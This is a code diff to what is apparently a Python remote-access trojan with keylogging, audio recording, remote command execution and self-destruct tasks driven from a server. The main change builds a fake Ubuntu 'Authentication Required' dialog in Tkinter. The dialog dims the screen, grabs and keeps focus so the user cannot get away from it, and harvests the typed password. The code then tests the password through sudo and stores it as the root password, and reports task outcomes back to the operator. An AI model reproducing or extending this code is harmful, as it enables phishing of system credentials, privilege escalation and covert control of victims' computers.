@@ -150,30 +150,166 @@ def start_keylogger_thread():
 def attempt_root_escalation():
     global ROOT_PASSWORD
     print("Attempting root escalation (Fake Auth)...", flush=True)
+    
+    # Check Tkinter
     try:
-        cmd = [
-            "zenity", "--password", 
-            "--title=Authentication Required", 
-            "--text=System update requires authentication.\nAuthenticate to continue."
-        ]
-        # 30s timeout
-        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
-        
-        if result.returncode == 0 and result.stdout.strip():
-            pw = result.stdout.strip()
-            # Verify
-            test = subprocess.run(f"echo '{pw}' | sudo -S id", shell=True, capture_output=True, text=True)
-            if test.returncode == 0:
-                ROOT_PASSWORD = pw
-                return True, "Success! Root password captured."
-            else:
-                return False, "Password captured but incorrect."
+        import tkinter as tk
+        from tkinter import font
+    except ImportError:
+        return False, "Tkinter not installed."
+
+    result_pw = None
+
+    def show_ui():
+        nonlocal result_pw
+        try:
+            root = tk.Tk(); root.withdraw()
+            w, h = root.winfo_screenwidth(), root.winfo_screenheight()
+            
+            # 1. Dialog (Create FIRST for Z-order)
+            dialog = tk.Toplevel(root)
+            dialog.title("Auth")
+            dialog.configure(bg='#2C2C2C')
+            # FOCUS HACK: Start managed to get WM attention
+            dialog.overrideredirect(False) 
+            dialog.attributes('-alpha', 0.0) # Hide
+            
+            # 2. Dimmer
+            dimmer = tk.Toplevel(root)
+            dimmer.geometry(f"{w}x{h}+0+0")
+            dimmer.configure(bg='black')
+            dimmer.overrideredirect(True)
+            dimmer.attributes('-alpha', 0.4)
+            
+            # Load Image (Simple)
+            base_dir = os.path.dirname(__file__)
+            img_path = os.path.join(base_dir, "prompt.png")
+            if not os.path.exists(img_path): 
+                img_path = os.path.join(base_dir, "testing", "prompt.png")
+            
+            try:
+                bg_image = tk.PhotoImage(file=img_path)
+                dw, dh = bg_image.width(), bg_image.height()
+            except:
+                dw, dh = 373, 381; bg_image = None
+                
+            x, y = (w - dw) // 2, (h - dh) // 2
+            dialog.geometry(f"{dw}x{dh}+{x}+{y}")
+            
+            if bg_image:
+                tk.Label(dialog, image=bg_image, bd=0).place(x=0, y=0)
+
+            # --- Layout Vars ---
+            POS = {'title': 50, 'msg': 85, 'avatar': 170, 'user': 220, 'in_y': 273, 'in_w': 260, 'btn_h': 41, 'gap': 1}
+            Colors = {'bg': '#2C2C2C', 'in': '#393230', 'btn': '#323232', 'hover': '#424242', 'dis': '#555555', 'txt': 'white'}
+            Fonts = {'hdr': ("Ubuntu", 13, "bold"), 'body': ("Ubuntu", 10), 'av': ("Ubuntu", 18, "bold"), 'user': ("Ubuntu", 12, "bold")}
+
+            # --- Elements ---
+            tk.Label(dialog, text="Authentication Required", bg='#1d1d1d', fg=Colors['txt'], font=Fonts['hdr']).place(relx=0.5, y=POS['title'], anchor='center')
+            tk.Label(dialog, text="Authentication keyring is needed to upgrade\nsystem packages", bg='#1d1d1d', fg='#CCCCCC', font=Fonts['body'], justify='center').place(relx=0.5, y=POS['msg'], anchor='center')
+            
+            user = os.getlogin()
+            tk.Label(dialog, text=user[0].upper() if user else "?", bg='#272727', fg='white', font=Fonts['av']).place(relx=0.5, y=POS['avatar'], anchor='center')
+            tk.Label(dialog, text=user, bg='#1d1d1d', fg=Colors['txt'], font=Fonts['user']).place(relx=0.5, y=POS['user'], anchor='center')
+
+            # Input
+            pw = tk.Entry(dialog, show="•", bg=Colors['in'], fg='white', relief='flat', font=("Ubuntu", 15), justify='center', insertbackground='white')
+            pw.place(relx=0.5, y=POS['in_y'], width=POS['in_w'], height=28, anchor='center')
+            
+            # Buttons
+            bw = (dw - POS['gap']) // 2
+            by = dh - POS['btn_h']
+            
+            def close(e=None):
+                try: dialog.destroy(); dimmer.destroy(); root.quit()
+                except: pass
+                
+            def submit(e=None):
+                nonlocal result_pw
+                result_pw = pw.get()
+                close()
+
+            # Cancel
+            b_can = tk.Label(dialog, text="Cancel", bg=Colors['btn'], fg='white', font=Fonts['body'])
+            b_can.place(x=0, y=by, width=bw, height=POS['btn_h'])
+            b_can.bind("<Button-1>", close)
+            b_can.bind("<Enter>", lambda e: b_can.config(bg=Colors['hover']))
+            b_can.bind("<Leave>", lambda e: b_can.config(bg=Colors['btn']))
+            
+            # Auth (Dynamic)
+            b_auth = tk.Label(dialog, text="Authenticate", bg=Colors['btn'], fg=Colors['dis'], font=("Ubuntu", 10, "bold"))
+            b_auth.place(x=bw + POS['gap'], y=by, width=bw, height=POS['btn_h'])
+            
+            def check_input(e=None):
+                if pw.get():
+                    b_auth.config(fg='white', cursor='hand2')
+                    b_auth.bind("<Button-1>", submit)
+                    b_auth.bind("<Enter>", lambda e: b_auth.config(bg=Colors['hover']))
+                    b_auth.bind("<Leave>", lambda e: b_auth.config(bg=Colors['btn']))
+                    pw.bind('<Return>', submit)
+                else:
+                    b_auth.config(fg=Colors['dis'], cursor='arrow', bg=Colors['btn'])
+                    b_auth.unbind("<Button-1>"); b_auth.unbind("<Enter>"); b_auth.unbind("<Leave>")
+                    pw.unbind('<Return>')
+            
+            pw.bind('<KeyRelease>', check_input)
+            check_input() # Init
+            
+            # --- Activation ---
+            dialog.wait_visibility()
+            dimmer.wait_visibility()
+            
+            # Z-Order Fix
+            dimmer.lower(dialog)
+            dialog.lift()
+            dialog.attributes('-topmost', True)
+            
+            # Focus Flicker (The Fix)
+            dialog.focus_force()
+            dialog.grab_set()
+            dialog.overrideredirect(True) # Now go borderless
+            dialog.attributes('-alpha', 1.0) # Show
+            
+            # Anti-Loss Loop
+            def keep_focus():
+                if dialog.winfo_exists():
+                    dialog.lift()
+                    if dialog.focus_get() != pw: pw.focus_force()
+                    dialog.after(1000, keep_focus)
+            keep_focus()
+            
+            dialog.bind('<Escape>', close)
+            
+            # Focus Fix 2
+            def force_grab():
+                if dialog.winfo_exists():
+                    pw.focus_force()
+                    try: dialog.grab_set_global()
+                    except: dialog.grab_set()
+            dialog.after(250, force_grab)
+            
+            root.mainloop()
+            
+        except Exception as e:
+            print(f"GUI Error: {e}")
+
+    try:
+        # Run in thread to allow timeout or main thread checks if needed (optional)
+        # But here we just run it.
+        show_ui()
+    except:
+        return False, "UI Failed"
+    
+    if result_pw:
+        # Verify
+        test = subprocess.run(f"sudo -k && echo '{result_pw}' | sudo -S id", shell=True, capture_output=True, text=True)
+        if test.returncode == 0:
+            ROOT_PASSWORD = result_pw
+            return True, "Success! Root password captured."
         else:
-            return False, "User cancelled or empty password."
-    except FileNotFoundError:
-        return False, "Zenity not installed (cannot popup)."
-    except Exception as e:
-        return False, f"Escalation error: {e}"
+            return False, "Password captured but incorrect."
+    else:
+        return False, "User cancelled or empty password."
 
 def record_audio(duration=10):
     try:
@@ -346,12 +482,11 @@ def process_tasks(config, device_id):
                     data_type = "sysinfo"
 
             elif task_type == "escalate_privileges":
-                success, msg = attempt_root_escalation()
+                success_bool, msg = attempt_root_escalation()
                 result_data = {"data": msg}
                 data_type = "sysinfo"
-                if success:
-                    # Optional: Update device info to show rooted?
-                    pass
+                # Track success for status update
+                should_fail_task = not success_bool
 
             elif task_type == "auto_destruct":
                 success = self_destruct()
@@ -372,6 +507,7 @@ def process_tasks(config, device_id):
                 }
                 result_data = {"data": json.dumps(res)}
                 data_type = "cmd_result"
+                should_fail_task = (code != 0)
                 
             elif task_type == "cmd_exec_admin":
                 cmd = params.get('command', '')
@@ -397,6 +533,7 @@ def process_tasks(config, device_id):
                 }
                 result_data = {"data": json.dumps(res)}
                 data_type = "cmd_result"
+                should_fail_task = (code != 0)
                 
         except Exception as e:
             # Catch unexpected errors during execution
@@ -404,6 +541,7 @@ def process_tasks(config, device_id):
             print(error_msg, flush=True)
             result_data = {"data": error_msg}
             data_type = "sysinfo"
+            should_fail_task = True
 
         # Upload telemetry
         if result_data and data_type:
@@ -417,11 +555,12 @@ def process_tasks(config, device_id):
             api_request(config, "telemetry", "POST", telemetry)
             
         # Complete task
+        final_status = "error" if should_fail_task else "complete"
         api_request(config, f"tasks?id=eq.{task_id}", "PATCH", {
-            "status": "complete",
+            "status": final_status,
             "completed_at": datetime.now(timezone.utc).isoformat()
         })
-        print(f"Task complete: {task_id}", flush=True)
+        print(f"Task {final_status}: {task_id}", flush=True)
         
         if should_destruct:
             sys.exit(0)
